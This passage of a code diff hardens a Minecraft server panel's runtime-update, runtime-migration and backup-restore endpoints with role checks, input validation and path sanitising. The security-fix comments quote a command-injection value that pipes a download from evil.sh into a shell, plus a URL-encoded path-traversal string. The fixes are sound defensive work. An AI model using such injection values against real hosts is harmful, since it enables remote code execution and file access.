+    let servers = await readJSON("servers.json") || [];
+    const serverIndex = servers.findIndex((s: any) => s.id === id);
+    if (serverIndex === -1) return res.status(404).json({ error: "Server not found" });
+    const server = servers[serverIndex];
+
+    if (user.role !== "admin" && user.role !== "owner" && server.owner !== user.id) {
+      return res.status(403).json({ error: "Only admins or owners can change runtime settings" });
+    }
+
+    // SECURITY FIX (was CRITICAL): dockerImage and startupCommand flow into
+    // docker pulls / process spawns. A normal user could previously set
+    // dockerImage to "alpine; curl evil.sh | sh" and get host code execution
+    // on next start. These fields are now ADMIN/OWNER ONLY and the image name
+    // must match a strict charset.
+    const isPrivilegedUser = user.role === "admin" || user.role === "owner";
+    if (!isPrivilegedUser && (dockerImage !== undefined || startupCommand !== undefined)) {
+      return res.status(403).json({ error: "Only admins and owners can set a custom Docker image or startup command" });
+    }
+    if (dockerImage !== undefined && dockerImage !== "" && !/^[a-zA-Z0-9._\/:-]+$/.test(dockerImage)) {
+      return res.status(400).json({ error: "Invalid docker image name — allowed characters: letters, digits, . _ / : -" });
+    }
+    if (startupCommand !== undefined && startupCommand !== null && typeof startupCommand !== "string") {
+      return res.status(400).json({ error: "startupCommand must be a string" });
+    }
+
+    if (server.containerId) {
+      const status = await getServerRuntimeStatus(server);
+      if (status?.State?.Running) {
+        return res.status(400).json({ error: "Server must be stopped before changing runtime. Please stop the server first." });
+      }
+    }
+    
+    // We must do a full backup before changing this if requested, but for now we just save it.
+    // The instructions say "When an administrator changes the Minecraft version: 1. Stop the server safely... 3. Create a complete backup."
+    // Let's call the internal backup logic.
+    const backupDir = path.join(process.cwd(), ".data", "backups", id);
+    await fs.ensureDir(backupDir);
+    const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
+    const backupFile = path.join(backupDir, `pre_runtime_update_${timestamp}.zip`);
+    const serverDir = path.join(process.cwd(), ".data", "servers", id);
+    
+
+    if (await fs.pathExists(serverDir)) {
+      const archiver = require("archiver");
+      const output = fs.createWriteStream(backupFile);
+      const archive = archiver('zip', { zlib: { level: 9 } });
+      archive.pipe(output);
+      archive.directory(serverDir, false);
+      
+      const serversJSON = await readJSON("servers.json");
+      archive.append(JSON.stringify(serversJSON.find((s: any) => s.id === id), null, 2), { name: "server_config_snapshot.json" });
+      
+      await archive.finalize();
+    }
+
+
+    server.version = version || server.version;
+    server.type = type || server.type;
+    server.javaVersion = javaVersion !== undefined ? javaVersion : server.javaVersion;
+    server.dockerImage = dockerImage !== undefined ? dockerImage : server.dockerImage;
+    server.serverJar = serverJar !== undefined ? serverJar : server.serverJar;
+    server.startupCommand = startupCommand !== undefined ? startupCommand : server.startupCommand;
+
+    servers[serverIndex] = server;
+    
+    if (server.containerId) {
+       await deleteServerRuntime(server);
+    }
+    
+    const newContainerId = await createServerRuntime(server);
+    server.containerId = newContainerId;
+    servers[serverIndex] = server;
+
+    await writeJSON("servers.json", servers);
+
+    res.json({ success: true, server });
+  } catch (err: any) {
+    console.error("Update runtime error", err);
+    res.status(500).json({ error: err.message });
+  }
+};
+
+export const migrateServerRuntime = async (req: Request, res: Response) => {
+  const { id } = req.params;
+  const { targetRuntime } = req.body;
+  const user = (req as any).user;
+
+  try {
+    const isDevPanel = (process.env.PANEL_TYPE === "dev" || process.env.PORT === "3000") && !process.env.FORCE_MAIN_PANEL;
+    if (!isDevPanel) {
+      return res.status(403).json({ 
+        error: "Runtime migration is disabled on the Main Panel (Port 6767). Server runtime is locked to your installation configuration. Use the Developer Panel (Port 3000) or reinstall." 
+      });
+    }
+
+    if (!targetRuntime || (targetRuntime !== "docker" && targetRuntime !== "local")) {
+      return res.status(400).json({ error: "Invalid target runtime. Must be 'docker' or 'local'." });
+    }
+
+    const servers = await readJSON("servers.json") || [];
+    const serverIndex = servers.findIndex((s: any) => s.id === id);
+    if (serverIndex === -1) {
+      return res.status(404).json({ error: "Server not found" });
+    }
+
+    const server = servers[serverIndex];
+    if (user.role !== "admin" && user.role !== "owner" && server.owner !== user.id) {
+      return res.status(403).json({ error: "Only admins or owners can migrate runtime" });
+    }
+
+    // Check if server is running
+    if (server.containerId) {
+      const status = await getServerRuntimeStatus(server);
+      if (status?.State?.Running) {
+        return res.status(400).json({ error: "Server must be stopped before migrating runtime. Please stop the server first." });
+      }
+      // Clean up old runtime instance (container or local process state)
+      await deleteServerRuntime(server);
+    }
+
+    // Update runtime type
+    server.runtimeType = targetRuntime;
+
+    // Create the new runtime container/process metadata
+    const newContainerId = await createServerRuntime(server);
+    server.containerId = newContainerId;
+    servers[serverIndex] = server;
+
+    await writeJSON("servers.json", servers);
+    res.json({ success: true, server, runtimeType: targetRuntime });
+  } catch (err: any) {
+    console.error("Migrate runtime error:", err);
+    res.status(500).json({ error: err.message || "Failed to migrate server runtime" });
+  }
+};
+
+
+
+export const restoreBackup = async (req: Request, res: Response) => {
+  if (!(await checkServerFileAccess(req, res))) return;
+  const { id, filename } = req.params;
+  const serverDir = path.join(process.cwd(), ".data", "servers", id);
+  const backupsDir = path.join(process.cwd(), ".data", "backups", id);
+  // SECURITY FIX: filename is a URL param and used to be joined unsanitized —
+  // "..%2F..%2F" could point the restore at any zip on disk.
+  const safeFilename = path.basename(filename);
+  const backupPath = path.join(backupsDir, safeFilename);
+
+  try {
+    if (!(await fs.pathExists(backupPath))) {
+      return res.status(404).json({ error: "Backup not found" });
+    }
+
+    // BUGFIX: status used to be checked with a fake {id} object, which always
+    // took the mock branch and reported "not running" — a live server's
+    // directory could then be wiped under it. Load the REAL server record.
+    const serversForStatus = await readJSON("servers.json") || [];
+    const realServer = serversForStatus.find((s: any) => s.id === id);
+    if (realServer && realServer.containerId) {
+      const status = await getServerRuntimeStatus(realServer);
+      if (status?.State?.Running) {
+        return res.status(400).json({ error: "Please stop the server before restoring a backup." });
+      }
+    }
+
+    // Clean current directory except some critical things if needed, but for full restore, we empty it
+    await fs.emptyDir(serverDir);
+
+    const extract = require("extract-zip");
+    await extract(backupPath, { dir: serverDir });
+    
+    // Check if there was a server_config_snapshot.json and apply it
+    const configSnapshot = path.join(serverDir, "server_config_snapshot.json");
+    if (fs.existsSync(configSnapshot)) {
+        const oldConfig = await readJSON(configSnapshot);
+        // SECURITY FIX: a crafted backup could previously overwrite critical
+        // fields (owner, containerId, runtimeType). Only safe fields are restored.
+        const SAFE_RESTORE_FIELDS = ["version", "type", "javaVersion", "serverJar", "ram", "port", "name", "onlineMode"];
+        const servers = await readJSON("servers.json");
+        const idx = servers.findIndex((s: any) => s.id === id);
+        if (idx !== -1 && oldConfig && typeof oldConfig === "object") {
+            const patch: any = {};
+            for (const field of SAFE_RESTORE_FIELDS) {
+              if (oldConfig[field] !== undefined) patch[field] = oldConfig[field];
+            }
+            servers[idx] = { ...servers[idx], ...patch };
+            await writeJSON("servers.json", servers);
+        }
+        await fs.remove(configSnapshot);
+    }
+
+    res.json({ success: true });
+  } catch (err: any) {
+    res.status(500).json({ error: err.message });
+  }
+};
